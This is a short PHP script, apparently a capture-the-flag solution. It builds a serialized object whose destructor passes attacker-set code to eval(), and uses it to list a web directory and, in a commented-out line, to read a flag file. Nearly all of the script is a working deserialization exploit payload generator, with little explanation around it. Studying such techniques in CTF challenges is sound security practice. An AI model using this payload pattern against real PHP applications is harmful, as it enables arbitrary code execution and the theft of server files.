<?php
class Anti
{
    public $info;
    function __construct()
    {
        $this->info = 'phpinfo();';
    }
    
    function __destruct()
    {
        eval($this->info);
    }
}
$a = new Anti();
$a->info = "print_r(scandir(\"/home/wwwroot/default\"));";

// $a->info = "print_r(file_get_contents(\"/home/wwwroot/default/f1ag_i3_h3re\"));";
// echo serialize($a).PHP_EOL;

echo str_replace('"','\"',serialize($a));

// $aa = 'phpinfo';
// echo serialize($aa);


?>